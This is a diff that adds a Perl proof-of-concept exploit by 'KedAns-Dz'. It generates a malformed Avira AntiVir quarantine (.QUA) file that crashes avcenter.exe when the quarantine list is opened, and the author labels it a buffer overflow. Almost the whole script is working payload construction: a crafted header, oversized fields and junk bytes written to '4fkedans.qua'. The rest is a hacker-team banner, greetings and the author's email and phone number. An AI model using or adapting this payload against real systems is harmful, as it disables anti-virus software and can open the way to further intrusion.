@@ -1,0 +1,55 @@
+#!/usr/bin/perl
+#================================================================================= |                
+#| # Title    : Avira AntVir QUA file in ( avcenter.exe) Local Crash PoC                                            |
+#| # Author   : KedAns-Dz                                                                                                                         |
+#| # email    : Ked-h@hotmail.com                                                                                                            |
+#| # Home     : HMD/AM (30500/04300) - Algeria -(00213555248701)                                         |
+#| # Web Site : /(~_-)\ ...                                                                                                                        |
+#| # Tested on : windows XP SP3 Français & Arabic                                                                             |
+#| # Target SFW : Avira Anti Virus Version 10.00.12.28                                                                     | 
+#| # Info : Copy the QUA file in :                                                                                                         |
+#          ..\..\All Users\Application Data\Avira\AntiVir Desktop\INFECTED                                     |
+#    > You are Opening The avcenter.exe and show Quarantine list                                                     |
+#                          the avcenter is Task kill and Show Crash Error                                                         |
+#======================      Exploit By KedAns-Dz       =================================  |
+# Perl File  : 
+#----------------------------------
+#START SYSTEM /root@MSdos/ : 
+system("title KedAns-Dz");
+system("color 1e");
+system("cls");
+print "\n\n".                  
+      "      ||========================================||\n".
+	  "      ||                                        ||\n".
+	  "      ||   Avira AntVir Local Crash PoC         ||\n".
+	  "      ||      Exploit Buffer Overflow           ||\n".
+	  "      ||    Created BY KedAns-Dz                ||\n".
+	  "      ||   ked-h(at)hotmail(dot)com             ||\n".
+	  "      ||                                        ||\n".
+	  "      ||========================================||\n\n\n";
+sleep(2);
+print "\n";
+my $Buf = 
+"\x41\x6e\x74\x69\x56\x69\x72\x20\x51\x75\x61\x00\x00\x00\x00\x00".
+"\x46\x01\x00\x00\x6a\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00".
+"\x00\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00\x00\x01\x00\x00\x00".
+"\x00\x00\x00\x00\x28\x00\x00\x02\x00\x00\x0e\x04\x69\x4c\x00\x00".
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x02\x00".
+"\x00\x07\x00\x00\x00\x42".
+"\x00" x 51 .
+"\x4b\x65\x64\x40\x41\x6e\x73\x2f\x41\x76\x32\x42\x6f\x46\x2e\x50\x6c\x7c". # Infected Name
+"\x31" x 378 . # Bad Multi Number
+"\x00" x 48 .
+"\x5c\x00\x5c\x00\x3f\x00\x5c\x00\x43\x00\x3a\x00\x5c\x00\x4b\x00\x2e\x00\x44\x00\x7a" . # Path V-Qua
+"\x41" x 380 ; # Junk
+$file = "4fkedans.qua";
+open (F ,">$file");
+print F $Buf;
+sleep (2);
+print "\n Creat File : $file , Succesfully ! \n";
+close (F);
+#================[ Exploited By KedAns-Dz * HST-Dz * ]=========================|
+#[»] Team :  [D] HaCkerS-StreeT-Team [Z] > Algerians Hackers <                 |
+# Greetz : Islampard * Zaki.Eng * Noro FouinY * BadR0 * Dr.Ride * Massinhou-Dz |
+# Red1One * Fox-Dz * Hani * XoreR * Mr.Dak007 * TOnyXED * all my friends ..    | 
+#------------------------------------------------------------------------------|
